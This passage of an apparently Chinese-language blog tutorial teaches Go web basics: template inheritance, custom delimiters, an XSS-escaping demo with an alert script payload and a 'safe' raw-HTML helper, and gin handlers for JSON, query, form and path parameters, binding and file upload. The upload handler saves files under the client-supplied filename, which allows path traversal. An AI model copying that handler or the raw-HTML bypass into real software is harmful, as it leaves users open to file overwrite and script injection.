class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//渲染模板</span></span><br><span class="line">	msg := <span class="string">&quot;这是Index页面&quot;</span></span><br><span class="line">	t.ExecuteTemplate(w, <span class="string">&quot;index.tmpl&quot;</span>, msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">home</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">//定义模板</span></span><br><span class="line">	<span class="comment">//解析模板</span></span><br><span class="line">	t, err := template.ParseFiles(<span class="string">&quot;./templates/basic.tmpl&quot;</span>, <span class="string">&quot;./templates/home.tmpl&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;parse failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//渲染模板</span></span><br><span class="line">	msg := <span class="string">&quot;这是home页面&quot;</span></span><br><span class="line">	t.ExecuteTemplate(w, <span class="string">&quot;home.tmpl&quot;</span>, msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/index&quot;</span>, index)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/home&quot;</span>, home)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;http serve failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>template</p>
<p>basic.tmpl</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>模板继承<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        * &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        </span></span><br><span class="line"><span class="css">        <span class="selector-class">.nav</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: cadetblue;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        </span></span><br><span class="line"><span class="css">        <span class="selector-class">.main</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        </span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: darkgreen;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        </span></span><br><span class="line"><span class="css">        <span class="selector-class">.center</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;menu&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;context center&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123;block &quot;context&quot; .&#125;&#125;&#123;&#123;end&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>index.tmpl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 继承根模板 --&gt;</span><br><span class="line">&#123;&#123;template &quot;basic.tmpl&quot; .&#125;&#125;</span><br><span class="line">&lt;!-- 重新定义区块 --&gt;</span><br><span class="line">&#123;&#123;define &quot;context&quot;&#125;&#125;</span><br><span class="line">&lt;h3&gt;这是Index2页面&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;hello &#123;&#123;.&#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>home.tmpl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 继承根模板 --&gt;</span><br><span class="line">&#123;&#123;template &quot;basic.tmpl&quot; .&#125;&#125;</span><br><span class="line">&lt;!-- 重新定义区块 --&gt;</span><br><span class="line">&#123;&#123;define &quot;context&quot;&#125;&#125;</span><br><span class="line">&lt;h3&gt;这是home2页面&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;hello &#123;&#123;.&#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="修改默认的标识符-标签转移转义"><a href="#修改默认的标识符-标签转移转义" class="headerlink" title="修改默认的标识符_标签转移转义"></a>修改默认的标识符_标签转移转义</h5><p>server</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;html/template&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	t, err := template.New(<span class="string">&quot;index.tmpl&quot;</span>).</span><br><span class="line">		Delims(<span class="string">&quot;&#123;[&quot;</span>, <span class="string">&quot;]&#125;&quot;</span>).</span><br><span class="line">		ParseFiles(<span class="string">&quot;./index.tmpl&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;parse failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	t.Execute(w, name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xss</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	t := template.New(<span class="string">&quot;xss.tmpl&quot;</span>).Funcs(template.FuncMap&#123;</span><br><span class="line">		<span class="string">&quot;safe&quot;</span>: <span class="function"><span class="keyword">func</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">template</span>.<span class="title">HTML</span></span> &#123;</span><br><span class="line">			<span class="keyword">return</span> template.HTML(s)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;)</span><br><span class="line">	_, err := t.ParseFiles(<span class="string">&quot;./xss.tmpl&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;parse failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	str1 := <span class="string">&quot;&lt;script&gt;alert(&#x27;嘿嘿嘿&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line">	str2 := <span class="string">&quot;&lt;a href=&#x27;https://woaixiaoyuyu.github.io/&#x27;&gt;xiaoyuyu 的 blog&lt;/a&gt;&quot;</span></span><br><span class="line">	t.Execute(w, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;str1&quot;</span>: str1,</span><br><span class="line">		<span class="string">&quot;str2&quot;</span>: str2,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/index&quot;</span>, index)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/xss&quot;</span>, xss)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;http serve failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>template</p>
<p>index.tmpl</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>修改默认的标识符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 发生在解析模板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>hello &#123;[.]&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>xss.tmpl</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;&#123;.str1&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span> &#123;&#123;.str2 | safe&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="gin-template"><a href="#gin-template" class="headerlink" title="gin_template"></a>gin_template</h4><p>基础的templates和静态文件渲染</p>
<p>就放个server吧</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.Static(<span class="string">&quot;/static&quot;</span>, <span class="string">&quot;./statics&quot;</span>)</span><br><span class="line">	r.Static(<span class="string">&quot;/xss&quot;</span>, <span class="string">&quot;./statics&quot;</span>)</span><br><span class="line">	<span class="comment">// r.LoadHTMLFiles(&quot;templates/index.tmpl&quot;)</span></span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;templates/**/*&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/posts&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;posts/index.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;title&quot;</span>: <span class="string">&quot;https://woaixiaoyuyu.github.io&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.GET(<span class="string">&quot;/users&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;users/index.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;title&quot;</span>: <span class="string">&quot;what????&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">//整一个网上的模板</span></span><br><span class="line">	r.GET(<span class="string">&quot;/home&quot;</span>,<span class="function"><span class="keyword">func</span> <span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">		c.HTML(http.StatusOK,<span class="string">&quot;home.html&quot;</span>,<span class="literal">nil</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="gin-json"><a href="#gin-json" class="headerlink" title="gin_json"></a>gin_json</h4><p>json的两种传参方式</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法二 结构体</span></span><br><span class="line"><span class="comment">//灵活使用tag来做定制操作</span></span><br><span class="line"><span class="keyword">type</span> msg <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name    <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Message <span class="keyword">string</span></span><br><span class="line">	Age     <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/json&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="comment">//方法一 使用map传递, gin中有类似模板gin.H</span></span><br><span class="line">		data := gin.H&#123;</span><br><span class="line">			<span class="string">&quot;name&quot;</span>:    <span class="string">&quot;xiaoyuyu&quot;</span>,</span><br><span class="line">			<span class="string">&quot;age&quot;</span>:     <span class="number">18</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;hello world&quot;</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		c.JSON(http.StatusOK, data)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/anthor_json&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		data := msg&#123;</span><br><span class="line">			Name:    <span class="string">&quot;xiaoyuyu&quot;</span>,</span><br><span class="line">			Message: <span class="string">&quot;hello golang!&quot;</span>,</span><br><span class="line">			Age:     <span class="number">18</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		c.JSON(http.StatusOK, data)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="query-string-Get请求较多"><a href="#query-string-Get请求较多" class="headerlink" title="query_string(Get请求较多)"></a>query_string(Get请求较多)</h4><p>介绍一下几种常见的query string的传参方式</p>
<p><code>querystring</code>指的是URL中<code>?</code>后面携带的参数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/query&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="comment">//第一种方法</span></span><br><span class="line">		<span class="comment">// name := c.Query(&quot;query&quot;)</span></span><br><span class="line">		<span class="comment">//第二种方法</span></span><br><span class="line">		<span class="comment">// name := c.DefaultQuery(&quot;query&quot;, &quot;nobody&quot;) //如果没有识别到query参数，就输出nobody</span></span><br><span class="line">		<span class="comment">//第三种常见的方法</span></span><br><span class="line">		name, ok := c.GetQuery(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> !ok &#123;</span><br><span class="line">			name = <span class="string">&quot;what???&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.JSON(http.StatusOK, name)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="获取form参数-Post请求较多"><a href="#获取form参数-Post请求较多" class="headerlink" title="获取form参数(Post请求较多)"></a>获取form参数(Post请求较多)</h4><p>请求的数据通过form表单来提交，例如向<code>/user/search</code>发送一个POST请求</p>
<p>server</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.LoadHTMLFiles(<span class="string">&quot;./login.html&quot;</span>, <span class="string">&quot;./index.html&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;login.html&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// /login.post</span></span><br><span class="line">	r.POST(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="comment">//从form表单提交的数据</span></span><br><span class="line">		<span class="comment">// 第一种</span></span><br><span class="line">		<span class="comment">// username := c.PostForm(&quot;username&quot;)</span></span><br><span class="line">		<span class="comment">// password := c.PostForm(&quot;password&quot;)</span></span><br><span class="line">		<span class="comment">// 第二种</span></span><br><span class="line">		username := c.DefaultPostForm(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;nobody&quot;</span>)</span><br><span class="line">		<span class="comment">// password := c.DefaultPostForm(&quot;password&quot;, &quot;kiding me?&quot;)</span></span><br><span class="line">		<span class="comment">// 第三种</span></span><br><span class="line">		password, ok := c.GetPostForm(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> !ok &#123;</span><br><span class="line">			password = <span class="string">&quot;wowwwwww!!!!&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;Name&quot;</span>:     username,</span><br><span class="line">			<span class="string">&quot;Password&quot;</span>: password,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="获取path参数-url路径参数"><a href="#获取path参数-url路径参数" class="headerlink" title="获取path参数(url路径参数)"></a>获取path参数(url路径参数)</h4><p>请求的参数通过URL路径传递，例如：<code>/user/search/xiaoyuyu</code></p>
<p>有时候我们需要获取他的url路径</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	r:=gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/:name/:how&quot;</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">		<span class="comment">// 获取路径参数</span></span><br><span class="line">		username:=c.Param(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">		motion:=c.Param(<span class="string">&quot;how&quot;</span>)</span><br><span class="line">		c.JSON(http.StatusOK,gin.H&#123;</span><br><span class="line">			<span class="string">&quot;name&quot;</span>:username,</span><br><span class="line">			<span class="string">&quot;motion&quot;</span>:motion,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="参数绑定"><a href="#参数绑定" class="headerlink" title="参数绑定"></a>参数绑定</h4><p>为了能够更方便的获取请求相关参数，提高开发效率，我们可以基于请求的<code>Content-Type</code>识别请求数据类型并利用反射机制自动提取请求中<code>QueryString</code>、<code>form表单</code>、<code>JSON</code>、<code>XML</code>等参数到结构体中</p>
<p>也就是说我们不必为不同的类型准备不同的方法或这结构体，可以一把梭了</p>
<p>额外说一句，postman真的香</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// UserInfo struct</span></span><br><span class="line"><span class="keyword">type</span> UserInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name     <span class="keyword">string</span> <span class="string">`form:&quot;username&quot;`</span></span><br><span class="line">	Password <span class="keyword">string</span> <span class="string">`form:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/home&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="keyword">var</span> u UserInfo</span><br><span class="line">		err := c.ShouldBind(&amp;u)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;err&quot;</span>: err.Error(),</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, u)</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;ok&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="单个文件上传"><a href="#单个文件上传" class="headerlink" title="单个文件上传"></a>单个文件上传</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;path&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	<span class="comment">// 处理multipart forms提交文件时默认的内存限制是32 MiB</span></span><br><span class="line">	<span class="comment">// 可以通过下面的方式修改</span></span><br><span class="line">	<span class="comment">// router.MaxMultipartMemory = 8 &lt;&lt; 20  // 8 MiB</span></span><br><span class="line">	r.LoadHTMLFiles(<span class="string">&quot;./index.html&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/index&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;index.html&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="comment">// 读取文件</span></span><br><span class="line">		f, err := c.FormFile(<span class="string">&quot;f1&quot;</span>) <span class="comment">//从请求中获取携带的参数</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// 将读取到的文件保存到服务端本地</span></span><br><span class="line">			dst := path.Join(<span class="string">&quot;./&quot;</span>, f.Filename)</span><br><span class="line">			c.SaveUploadedFile(f, dst)</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;ok&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

